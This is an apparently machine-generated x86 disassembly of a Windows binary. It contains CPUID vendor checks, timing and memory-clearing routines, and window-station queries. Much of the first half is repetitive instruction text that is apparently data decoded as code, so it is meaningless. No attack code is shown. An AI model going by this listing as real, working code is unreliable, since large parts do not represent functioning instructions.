add [ eax ] 0x40
adc [ eax - 0x7ffffff0 ] al
adc [ eax + 0x10 ] al
add [ eax ] al
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] dl
add [ eax ] 0x0
adc [ eax + 0x104010 ] al
adc [ eax ] al
add [ eax - 0x7fffbff0 ] al
add [ eax + 0x10 ] al
adc [ eax ] 0x0
adc [ eax + 0x104010 ] al
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
adc [ eax ] al
adc [ eax ] al
adc [ eax ] al
adc [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax + 0x10 ] al
adc [ eax ] 0x0
adc [ eax - 0x7fffc000 ] al
adc [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
adc [ eax ] al
add [ eax + 0x10 ] al
add [ eax ] al
add [ eax ] dl
adc [ eax ] 0x40
add [ eax + 0x10 ] al
adc [ eax + 0x10 ] al
add [ eax ] dl
inc eax
add [ eax ] al
adc [ eax ] al
adc [ eax - 0x80000000 ] al
add [ eax + 0x10 ] al
add [ eax ] 0x40
adc [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
adc [ eax ] 0x0
add [ eax ] eax
add [ eax + eax ] al
add [ esp + eax ] eax
add [ ecx ] al
add [ eax ] al
add [ ecx ] eax
add [ ecx + eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ ecx + eax ] al
add [ eax ] eax
add al 0x0
add [ eax + eax ] eax
add [ ecx ] al
add [ eax + eax ] al
add [ eax + eax ] al
add [ eax ] al
add al 0x4
add [ eax ] eax
add [ eax ] al
add [ ecx ] eax
add al 0x4
add [ ecx ] eax
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] eax
add al 0x4
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add al 0x0
add [ ecx ] al
add al 0x4
add [ ecx ] al
add [ eax ] al
add [ ecx ] eax
add [ eax ] al
add [ ecx ] eax
add al 0x4
add [ eax ] al
add al 0x0
add [ eax ] eax
add [ ecx + eax ] al
add [ esp + eax ] al
add [ ecx ] al
add [ ecx + eax ] al
add [ eax + eax ] eax
add [ eax ] al
add al 0x4
add [ ecx ] al
add al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + eax ] al
add [ eax + eax ] eax
add [ ecx ] al
add al 0x4
add [ ecx ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add al 0x0
add [ ecx ] eax
add [ eax ] al
add [ eax ] eax
add al 0x0
add [ eax ] al
add al 0x4
add [ ecx ] eax
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + eax ] eax
add [ ecx ] al
add al 0x0
add [ eax ] eax
add al 0x4
add [ eax ] eax
add al 0x0
add [ eax ] al
add [ ecx + eax ] al
add [ esp + eax ] eax
add [ eax ] eax
add [ eax ] al
add [ ecx ] eax
add al 0x0
add [ eax ] eax
add [ eax + eax ] al
add [ eax ] al
add al 0x1
add [ esp + eax ] eax
add [ eax ] al
add al 0x0
add [ ecx ] al
add [ ecx + eax ] al
add [ eax ] eax
add al 0x0
add [ eax + eax ] eax
add [ ecx ] al
add [ eax + eax ] al
add [ eax ] al
add [ ecx ] al
add [ esp + eax ] al
add [ ecx ] eax
add [ eax ] al
add [ eax ] eax
add [ ecx + eax ] al
add [ eax + eax ] eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add al 0x4
or [ eax ] dl
inc eax
add [ eax ] al
adc [ eax ] al
adc [ eax ] cl
add [ eax ] al
add [ eax ] cl
adc [ eax + 0x10 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
adc [ eax ] cl
adc [ eax ] al
adc [ eax ] cl
add [ eax ] al
add [ eax ] dl
inc eax
adc [ eax ] cl
add [ eax ] al
adc [ eax ] al
add [ eax ] al
adc [ eax ] cl
adc [ eax ] al
add [ eax ] cl
add [ eax ] al
adc [ eax ] cl
adc [ eax ] al
add [ eax ] al
inc eax
add [ eax ] al
add [ eax ] al
adc [ eax ] cl
add [ eax + 0x10 ] al
add [ eax ] dl
inc eax
add [ eax ] al
adc [ eax ] al
add [ eax ] cl
add [ eax ] al
add [ eax ] al
adc [ eax ] al
or [ eax ] dl
add [ eax ] dl
add [ eax ] al
inc eax
adc [ eax ] al
adc [ eax ] al
add [ eax ] cl
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ eax ] al
add [ eax ] dl
inc eax
adc [ eax ] al
adc [ eax ] al
adc [ eax ] cl
add [ eax + 0x10 ] al
or [ eax ] dl
inc eax
adc [ eax ] al
add [ eax ] al
or [ eax ] al
inc eax
adc [ eax ] cl
adc [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] dl
add [ eax ] dl
inc eax
add [ eax ] al
adc [ eax ] al
adc [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax + 0x10 ] al
or [ eax ] dl
add [ eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
or [ eax ] al
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ eax + 0x10 ] al
add [ eax ] dl
inc eax
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] cl
adc [ eax + 0x10 ] al
or [ eax ] dl
inc eax
add [ eax ] al
add [ eax ] al
or [ eax ] dl
inc eax
adc [ eax ] cl
add [ eax ] al
add [ eax ] al
adc [ eax ] al
adc [ eax ] cl
adc [ eax ] al
or [ eax ] al
inc eax
add [ eax ] al
adc [ eax ] al
add [ eax ] al
inc eax
adc [ eax ] cl
adc [ eax ] al
adc [ eax ] cl
adc [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] cl
add [ eax ] al
adc [ eax ] al
adc [ eax + 0x10 ] al
add [ eax ] al
add [ eax ] cl
add [ eax ] al
add [ eax ] eax
add [ eax + eax ] al
add [ eax ] ah
add al 0x1
or [ eax ] ah
add [ ecx ] al
or [ eax ] al
add al 0x0
or [ eax ] ah
add al 0x1
add [ eax ] al
add [ ecx ] al
or [ eax ] al
add [ ecx ] al
add [ eax ] ah
add [ eax ] al
add [ eax ] ah
add [ eax ] al
or [ eax ] al
add al 0x1
add [ eax ] ah
add al 0x0
or [ eax ] ah
add [ ecx ] al
or [ eax ] al
add al 0x1
or [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x1
add [ eax ] al
add [ eax ] al
or [ eax ] ah
add [ ecx ] al
add [ eax ] ah
add al 0x0
add [ eax ] al
add al 0x0
or [ eax ] ah
add al 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] ah
add [ eax ] al
or [ eax ] ah
add [ eax ] al
add [ eax ] ah
add al 0x0
or [ eax ] ah
add al 0x1
or [ eax ] ah
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
or [ eax ] al
add al 0x0
add [ eax ] ah
add al 0x0
add [ eax ] al
add al 0x1
or [ eax ] al
add al 0x1
or [ eax ] ah
add al 0x0
or [ eax ] ah
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
or [ eax ] al
add [ ecx ] al
add [ eax ] ah
add [ eax ] al
add [ eax ] ah
add [ eax ] al
or [ eax ] al
add al 0x0
or [ eax ] al
add [ eax ] al
or [ eax ] al
add al 0x1
add [ eax ] ah
add al 0x1
or [ eax ] al
add [ eax ] al
add [ eax ] ah
add al 0x1
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al 0x0
add [ eax ] ah
add [ ecx ] al
add [ eax ] ah
add al 0x0
or [ eax ] al
add al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] ah
add al 0x1
or [ eax ] ah
add [ ecx ] al
or [ eax ] al
add al 0x1
or [ eax ] ah
add al 0x0
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al 0x1
add [ eax ] ah
add [ ecx ] al
or [ eax ] al
add al 0x0
or [ eax ] ah
add al 0x0
add [ eax ] ah
add [ eax ] al
add [ eax ] ah
add al 0x1
add [ eax ] al
add [ ecx ] al
or [ eax ] ah
add [ eax ] al
or [ eax ] al
add [ eax + 0x200040 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
and [ eax + 0x200040 ] al
add [ eax ] ah
add [ eax ] al
inc eax
and [ eax ] al
add [ eax ] 0x0
and [ eax ] al
inc eax
and [ eax ] al
add [ eax + 0x20 ] al
and [ eax + 0x202000 ] al
add [ eax ] al
add [ eax - 0x7fffe000 ] al
inc eax
add [ eax ] al
add [ eax ] 0x0
and [ eax + 0x202040 ] al
add [ eax ] al
and [ eax ] al
inc eax
and [ eax ] al
add [ eax ] 0x20
add [ eax ] 0x0
add [ eax ] al
add [ eax ] ah
add [ eax ] al
inc eax
add [ eax ] al
add [ eax ] al
and [ eax ] ah
add [ eax ] 0x20
add [ eax + 0x20 ] 0x20
add [ eax ] 0x0
and [ eax - 0x80000000 ] al
inc eax
and [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
and [ eax ] al
inc eax
and [ eax ] ah
add [ eax ] al
and [ eax ] al
add [ eax + 0x20 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] 0x20
add [ eax + 0x202040 ] al
add [ eax ] ah
and [ eax + 0x200040 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
add [ eax - 0x80000000 ] al
add [ eax ] ah
add [ eax ] al
inc eax
add [ eax ] ah
add [ eax ] 0x0
and [ eax ] al
inc eax
add [ eax ] ah
add [ eax + 0x20 ] al
and [ eax + 0x202000 ] al
inc eax
add [ eax ] al
add [ eax + 0x20 ] al
and [ eax + 0x202000 ] al
add [ eax ] al
and [ eax ] al
inc eax
and [ eax ] al
add [ eax ] 0x0
add [ eax ] 0x0
and [ eax + 0x202040 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
add [ eax ] al
inc eax
add [ eax ] al
add [ eax + 0x20 ] 0x0
add [ eax ] 0x20
and [ eax - 0x7fe00000 ] al
inc eax
and [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ eax ] ah
add [ eax ] 0x40
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx ] al
add [ ecx ] al
add al 0x0
add [ ecx ] al
add al 0x42
add [ ecx ] al
add al 0x40
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + eax ] eax
add [ ecx ] al
add al 0x2
add [ eax ] al
add [ eax ] al
add [ eax + eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] eax
inc eax
add [ ecx ] al
add al 0x2
add [ eax ] al
add al 0x2
add [ ecx ] al
add [ eax ] al
add [ eax + eax * 2 ] al
add [ eax ] al
add al 0x42
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ecx ] al
add al 0x0
add [ ecx ] al
add [ edx ] al
add [ eax + eax * 2 ] al
add [ ecx ] al
add al 0x42
add [ eax ] al
add [ edx ] al
add [ eax + eax ] eax
add [ eax ] al
add al 0x42
add [ eax ] al
add al 0x40
add [ ecx ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add al 0x42
add [ eax ] al
add [ eax ] al
add [ eax + eax * 2 ] eax
add [ ecx ] al
add al 0x2
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax + eax * 2 ] eax
add [ ecx ] al
add al 0x2
add [ ecx ] al
add al 0x42
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax + eax ] al
add [ ecx ] al
add al 0x0
add [ eax ] al
add [ edx ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add al 0x2
add [ ecx ] al
add [ edx ] al
add [ ecx ] al
add [ edx ] al
add [ edx + eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + eax * 2 ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ edx ] al
add [ eax + eax ] eax
add [ eax ] al
add al 0x40
add [ eax ] al
add al 0x42
add [ ecx ] al
add al 0x0
add [ ecx ] al
add [ edx ] al
add [ eax ] eax
inc eax
add [ ecx ] al
add al 0x40
add [ eax ] al
add [ eax ] 0x80
and [ eax ] al
add [ edx + 0x2008020 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
and [ eax + 0x8000 ] al
add [ eax - 0x7dff7fe0 ] al
and [ eax ] al
add [ eax ] al
and [ eax ] al
add [ edx + 0x2008000 ] al
add [ eax - 0x7fff7e00 ] al
add [ edx ] al
and [ eax + 0x200000 ] al
add [ eax + 0x2000020 ] al
add [ eax - 0x7fff7e00 ] al
add [ eax + 0x2000000 ] al
and [ eax - 0x7fdf7e00 ] al
add [ eax ] al
and [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
and [ eax ] al
add [ eax + 0x2008000 ] al
and [ eax + 0x208000 ] al
add [ eax + 0x2000000 ] al
add [ eax ] al
add [ edx + 0x8020 ] al
add [ eax ] al
add [ eax + 0x2000000 ] al
add [ eax - 0x7fe00000 ] al
add [ edx + 0x2008020 ] al
add [ eax ] al
add [ eax ] al
and [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x7fff8000 ] al
and [ eax + 0x200200 ] al
add [ edx ] al
and [ eax + 0x8000 ] al
add [ edx + 0x8020 ] al
add [ eax + 0x8000 ] al
add [ edx ] al
and [ eax + 0x208200 ] al
add [ eax - 0x80000000 ] al
and [ eax + 0x200000 ] al
add [ edx + 0x2008000 ] al
add [ eax + 0x200200 ] al
add [ eax + 0x8020 ] al
add [ eax ] al
add [ edx - 0x7dff7fe0 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax + 0x208000 ] al
add [ edx ] al
add [ eax - 0x74ff7e00 ] al
inc esp
and al 0x4
push eax
call [ rw-data ]
add esp 0x4
retn
sub_431b40
push ebx
mov ebx [ esp + 0x8 ]
xor ecx ecx
cmp ebx ecx
jg r-xdata
mov eax [ rw-data ]
push ebp
push esi
mov esi [ esp + 0x18 ]
push edi
mov edi [ esp + 0x18 ]
mov [ rw-data ] ecx
cmp eax ecx
je r-xdata
xor eax eax
pop ebx
retn
push esi
push edi
push ebx
call [ rw-data ]
mov ebp eax
mov eax [ rw-data ]
add esp 0xc
test eax eax
je r-xdata
push ecx
push esi
push edi
push ebx
push ecx
mov [ rw-data ] ecx
call eax
add esp 0x14
pop edi
pop esi
mov eax ebp
pop ebp
pop ebx
retn
push 0x1
push esi
push edi
push ebx
push ebp
call eax
add esp 0x14
sub_431bb0
push ebp
mov ebp [ esp + 0x8 ]
test ebp ebp
jne r-xdata
push ebx
mov ebx [ esp + 0x10 ]
test ebx ebx
jg r-xdata
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push eax
push ecx
push edx
call sub_431b40
add esp 0xc
pop ebp
retn
mov eax [ rw-data ]
push esi
mov esi [ esp + 0x1c ]
push edi
mov edi [ esp + 0x1c ]
test eax eax
je r-xdata
pop ebx
xor eax eax
pop ebp
retn
push esi
push edi
push ebx
push ebp
call [ rw-data ]
mov ecx [ rw-data ]
add esp 0x10
mov [ esp + 0x14 ] eax
test ecx ecx
je r-xdata
push 0x0
push esi
push edi
push ebx
push 0x0
push ebp
call eax
add esp 0x18
pop edi
pop esi
pop ebx
pop ebp
retn
push 0x1
push esi
push edi
push ebx
push eax
push ebp
call ecx
mov eax [ esp + 0x2c ]
add esp 0x18
sub_431c30
mov eax [ rw-data ]
push esi
mov esi [ esp + 0x8 ]
test eax eax
je r-xdata
push esi
call [ rw-data ]
mov eax [ rw-data ]
add esp 0x4
pop esi
test eax eax
je r-xdata
push 0x0
push esi
call eax
add esp 0x8
retn
push 0x1
push 0x0
call eax
add esp 0x8
sub_431c70
mov eax 0x8
call sub_43a7f0
xor eax eax
test [ rw-data ] 0x1
je r-xdata
add esp 0x8
retn
lea eax [ esp ]
push esi
push eax
call sub_4325a0
push 0x126
push r--data
push 0x14
push 0x5
call sub_432950
add esp 0x14
test [ rw-data ] 0x2
jne r-xdata
mov esi 0x1
lea ecx [ esp + 0x4 ]
push ecx
push rw-data
call sub_4325e0
add esp 0x8
test eax eax
jne r-xdata
xor esi esi
jmp r-xdata
push 0x12b
push r--data
push 0x14
push 0x6
call sub_432950
add esp 0x10
mov eax esi
pop esi
sub_431cf0
mov eax [ esp + 0x4 ]
push esi
push eax
call sub_432660
mov ecx eax
shr eax 0x4
imul eax eax 0xfb
mov edx ecx
imul ecx ecx 0x45bb
shr edx 0xe
lea esi [ edx * 8 ]
sub esi edx
add eax esi
add esp 0x4
add eax ecx
pop esi
retn
sub_431d30
mov eax 0x1c
call sub_43a7f0
xor eax eax
cmp [ rw-data ] eax
je r-xdata
add esp 0x1c
retn
lea eax [ esp ]
push esi
push eax
call sub_4325a0
mov edx [ rw-data ]
lea ecx [ esp + 0x8 ]
push ecx
push edx
call sub_432e60
mov esi eax
add esp 0xc
test esi esi
je r-xdata
pop esi
push edi
mov edi [ esi + 0x14 ]
test edi edi
je r-xdata
or eax 0xffffffff
add [ esi + 0x18 ] eax
cmp [ esi + 0x18 ] 0x0
jg r-xdata
mov eax [ rw-data ]
inc [ edi + 0x18 ]
push edi
push eax
call sub_432dd0
add esp 0x8
mov eax esi
pop edi
mov [ esi + 0x14 ] 0x0
test edi edi
je r-xdata
push esi
call sub_431c30
add esp 0x4
add [ edi + 0x18 ] eax
sub_431db0
mov eax 0x8
call sub_43a7f0
call sub_431c70
test eax eax
je r-xdata
xor eax eax
add esp 0x8
retn
push ebx
push 0xdc
push r--data
push 0x14
push 0x9
call sub_432950
mov ebx 0x1
add esp 0x10
test [ rw-data ] bl
je r-xdata
push esi
push 0x11a
push r--data
push 0x14
push 0xa
call sub_432950
push 0x196
push r--data
push 0x1c
call sub_431b40
mov esi eax
add esp 0x1c
test esi esi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
call sub_4325a0
add esp 0x4
cmp [ rw-data ] 0x0
je r-xdata
push 0xdc
push r--data
push 0x14
push 0x9
call sub_432950
add esp 0x10
pop esi
test [ rw-data ] bl
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push 0xfa
push r--data
push 0x14
push 0xa
call sub_432950
push 0x100
push r--data
push 0x1b
push 0x9
call sub_432950
push 0x101
push r--data
push 0x14
push 0x9
call sub_432950
and [ rw-data ] 0xfffffffd
lea edx [ esp + 0x34 ]
push edx
push rw-data
call sub_432640
add esp 0x38
lea ecx [ esp + 0x4 ]
push ecx
push rw-data
call sub_4325e0
add esp 0x8
test eax eax
je r-xdata
push 0x11a
push r--data
push 0x14
push 0xa
call sub_432950
add esp 0x10
pop ebx
cmp [ rw-data ] 0x0
je r-xdata
push esi
call sub_4325a0
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x18 ]
mov [ esi + 0x8 ] eax
mov eax [ rw-data ]
push esi
push eax
mov [ esi + 0xc ] ecx
mov [ esi + 0x10 ] edx
mov [ esi + 0x18 ] ebx
mov [ esi + 0x14 ] 0x0
call sub_432dd0
add esp 0xc
test eax eax
je r-xdata
push j_sub_4325e0
push sub_431cf0
call sub_432d00
add esp 0x8
mov [ rw-data ] eax
test eax eax
jne r-xdata
add [ rw-data ] ebx
sub [ rw-data ] ebx
jne r-xdata
mov [ esi + 0x14 ] eax
push esi
call sub_431c30
add esp 0x4
jmp r-xdata
or [ rw-data ] 0x2
push 0x111
push r--data
push 0x1b
push 0xa
call sub_432950
add esp 0x10
sub_431f80
mov eax 0x8
call sub_43a7f0
push esi
xor esi esi
call sub_431c70
test eax eax
je r-xdata
mov eax esi
pop esi
add esp 0x8
retn
push ebx
push 0xdc
push r--data
push 0x14
push 0x9
call sub_432950
mov ebx 0x1
add esp 0x10
test [ rw-data ] bl
je r-xdata
push 0x11a
push r--data
push 0x14
push 0xa
call sub_432950
call sub_431d30
push 0xdc
mov esi eax
push r--data
neg esi
sbb esi esi
push 0x14
push 0x9
neg esi
call sub_432950
add esp 0x20
test [ rw-data ] bl
je r-xdata
lea eax [ esp + 0x8 ]
push eax
call sub_4325a0
add esp 0x4
cmp [ rw-data ] esi
je r-xdata
push 0x11a
push r--data
push 0x14
push 0xa
call sub_432950
add esp 0x10
pop ebx
cmp [ rw-data ] 0x0
je r-xdata
push 0xfa
push r--data
push 0x14
push 0xa
call sub_432950
push 0x100
push r--data
push 0x1b
push 0x9
call sub_432950
push 0x101
push r--data
push 0x14
push 0x9
call sub_432950
and [ rw-data ] 0xfffffffd
lea edx [ esp + 0x38 ]
push edx
push rw-data
call sub_432640
add esp 0x38
lea ecx [ esp + 0x8 ]
push ecx
push rw-data
call sub_4325e0
add esp 0x8
test eax eax
je r-xdata
sub [ rw-data ] ebx
jne r-xdata
add [ rw-data ] ebx
or [ rw-data ] 0x2
push 0x111
push r--data
push 0x1b
push 0xa
call sub_432950
add esp 0x10
sub_432100
push ebp
push ebx
push esi
push edi
xor edx edx
pushfd
pop eax
mov ecx eax
xor eax 0x200000
push eax
popfd
pushfd
pop eax
xor ecx eax
bt ecx 0x15
jae r-xdata
mov eax edx
mov edx ecx
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
cpuid
mov edi eax
xor eax eax
cmp ebx 0x756e6547
setne al
mov ebp eax
cmp edx 0x49656e69
setne al
or ebp eax
cmp ecx 0x6c65746e
setne al
or ebp eax
je r-xdata
cmp edi 0x4
mov edi 0xffffffff
jb r-xdata
cmp ebx 0x68747541
setne al
mov esi eax
cmp edx 0x69746e65
setne al
or esi eax
cmp ecx 0x444d4163
setne al
or esi eax
jne r-xdata
mov eax 0x1
cpuid
cmp ebp 0x0
jne r-xdata
mov eax 0x4
mov ecx 0x0
cpuid
mov edi eax
shr edi 0xe
and edi 0xfff
mov eax 0x80000000
cpuid
cmp eax 0x80000008
jb r-xdata
bt edx 0x1c
jae r-xdata
and ah 0xf
cmp ah 0xf
jne r-xdata
mov eax 0x80000008
cpuid
movzx esi cl
inc esi
mov eax 0x1
cpuid
bt edx 0x1c
jae r-xdata
and edx 0xefffffff
cmp edi 0x0
je r-xdata
or edx 0x100000
shr ebx 0x10
and ebx 0xff
cmp ebx esi
ja r-xdata
or edx 0x10000000
shr ebx 0x10
cmp bl 0x1
ja r-xdata
and edx 0xefffffff
jmp r-xdata
and edx 0xefffffff
sub_432270
lea ecx [ rw-data ]
bt [ ecx ] 0x4
jae r-xdata
xor eax eax
xor edx edx
retn
push cs
nop
pop eax
nop
and eax 0x3
jne r-xdata
pushfd
pop eax
bt eax 0x9
jae r-xdata
rdtsc
push edx
push eax
hlt
sub_4322c0
pushfd
pop eax
bt eax 0x9
jae r-xdata
xor eax eax
xor edx edx
retn
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
push ds
mov ds ax
nop
xor eax eax
mov edx [ ecx ]
jmp r-xdata
inc eax
cmp edx [ ecx ]
je r-xdata
nop
nop
nop
pop ds
retn
sub_432310
xor eax eax
xor edx edx
lea ecx [ rw-data ]
mov ecx [ ecx ]
bt [ ecx ] 0x1
jae r-xdata
lea eax [ esp + 0x4 ]
retn
bt [ ecx ] 0x1a
jae r-xdata
fldz
fldz
fldz
fldz
fldz
fldz
fldz
fldz
fwait
fninit
nop
pxor xmm0 xmm0
pxor xmm1 xmm1
pxor xmm2 xmm2
pxor xmm3 xmm3
pxor xmm4 xmm4
pxor xmm5 xmm5
pxor xmm6 xmm6
pxor xmm7 xmm7
sub_432390
push ebp
mov ebp esp
sub esp 0x1c
mov ecx [ ebp + 0xc ]
mov [ esp ] ecx
mov edx [ ebp + 0x10 ]
mov [ esp + 0x4 ] edx
mov eax [ ebp + 0x14 ]
mov [ esp + 0x8 ] eax
mov eax [ ebp + 0x18 ]
mov [ esp + 0xc ] eax
mov eax [ ebp + 0x1c ]
mov [ esp + 0x10 ] eax
mov eax [ ebp + 0x20 ]
mov [ esp + 0x14 ] eax
mov eax [ ebp + 0x24 ]
mov [ esp + 0x18 ] eax
call [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
sub_4323d0
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
xor eax eax
cmp ecx 0x7
jae r-xdata
test edx 0x3
je r-xdata
cmp ecx 0x0
je r-xdata
mov [ edx ] eax
lea ecx [ ecx - 0x4 ]
test ecx 0xfffffffc
lea edx [ edx + 0x4 ]
jne r-xdata
mov [ edx ] al
lea ecx [ ecx - 0x1 ]
lea edx [ edx + 0x1 ]
jmp r-xdata
retn
mov [ edx ] al
sub ecx 0x1
lea edx [ edx + 0x1 ]
jne r-xdata
cmp ecx 0x0
jne r-xdata
retn
sub_432450
push edi
mov edi [ esp + 0x8 ]
test edi edi
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
or eax 0xffffffff
sub eax edi
mov edi eax
pop edi
retn
push 0x131
push r--data
push 0x1d
push 0x9
call sub_432950
mov eax [ rw-data ]
add esp 0x10
test eax eax
je r-xdata
push 0x135
push r--data
push 0x1d
push 0xa
call sub_432950
add esp 0x10
pop edi
retn
push eax
call sub_434850
add esp 0x4
cmp edi eax
jge r-xdata
mov ecx [ rw-data ]
push esi
push edi
push ecx
call sub_434860
mov esi eax
add esp 0x8
test esi esi
je r-xdata
push 0x14b
push r--data
push 0x1d
push 0xa
call sub_432950
add esp 0x10
test esi esi
je r-xdata
dec [ esi ]
cmp [ esi ] 0x0
jg r-xdata
pop esi
mov eax [ esi + 0x4 ]
push 0x14f
push r--data
push eax
call [ rw-data ]
push esi
call sub_431c30
add esp 0x10
xor esi esi
mov edx [ rw-data ]
push 0x0
push edi
push edx
call sub_434880
add esp 0xc
jmp r-xdata
sub_432520
push esi
push edi
mov edi [ esp + 0xc ]
xor esi esi
test edi edi
je r-xdata
push 0x15a
push r--data
push 0x1d
push 0x9
call sub_432950
mov eax [ rw-data ]
add esp 0x10
test eax eax
je r-xdata
or eax 0xffffffff
sub eax edi
mov edi eax
push 0x161
push r--data
push 0x1d
push 0xa
call sub_432950
add esp 0x10
test esi esi
je r-xdata
push eax
call sub_434850
add esp 0x4
cmp edi eax
jge r-xdata
pop edi
xor eax eax
pop esi
retn
mov eax [ esi + 0x4 ]
pop edi
pop esi
retn
mov ecx [ rw-data ]
push edi
push ecx
call sub_434860
mov esi eax
add esp 0x8
test esi esi
je r-xdata
inc [ esi ]
sub_4325a0
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
jmp eax
call [ GetCurrentThreadId@IAT ]
mov edx [ esp + 0x4 ]
xor ecx ecx
mov [ edx ] ecx
mov [ edx + 0x4 ] eax
retn
call eax
mov edx [ esp + 0x4 ]
xor ecx ecx
mov [ edx ] ecx
mov [ edx + 0x4 ] eax
retn
sub_4325e0
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax 0x8
push esi
mov edi edi
movzx eax [ edx ]
movzx esi [ ecx ]
sub eax esi
jne r-xdata
sub eax 0x4
add ecx 0x4
add edx 0x4
cmp eax 0x4
jae r-xdata
sar eax 0x1f
or eax 0x1
pop esi
retn
movzx eax [ edx + 0x1 ]
movzx esi [ ecx + 0x1 ]
sub eax esi
jne r-xdata
mov esi [ edx ]
cmp esi [ ecx ]
jne r-xdata
xor eax eax
pop esi
retn
movzx eax [ edx + 0x2 ]
movzx esi [ ecx + 0x2 ]
sub eax esi
jne r-xdata
movzx eax [ edx + 0x3 ]
movzx ecx [ ecx + 0x3 ]
sub eax ecx
sub_432670
cmp [ rw-data ] 0x0
jne r-xdata
retn
push r--data
mov [ rw-data ] 0x1
call sub_43b17b
add esp 0x4
test eax eax
je r-xdata
call sub_432100
or eax 0x400
mov [ rw-data ] eax
push 0x0
push 0x0
push eax
call sub_43a62a
add esp 0xc
or eax 0x400
mov [ rw-data ] eax
retn
sub_4326c0
push ebp
mov ebp esp
mov eax 0x8
call sub_43a7f0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
push esi
push edi
test eax eax
jne r-xdata
cmp eax 0xffffffff
je r-xdata
push eax
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
call [ GetDesktopWindow@IAT ]
call [ GetProcessWindowStation@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
call eax
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
push r--data
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
jmp r-xdata
or eax 0xffffffff
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push 0x2
push ebx
call [ GetUserObjectInformationW@IAT ]
test eax eax
jne r-xdata
mov [ rw-data ] 0xffffffff
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp eax 0x200
ja r-xdata
lea esi [ eax + 0x1 ]
and esi 0xfffffffe
lea eax [ esi + 0x2 ]
mov [ ebp - 0x8 ] esi
call sub_43b260
mov edi esp
lea ecx [ ebp - 0x8 ]
push ecx
push esi
push edi
push 0x2
push ebx
call [ GetUserObjectInformationW@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
inc eax
and eax 0xfffffffe
mov [ ebp - 0x8 ] eax
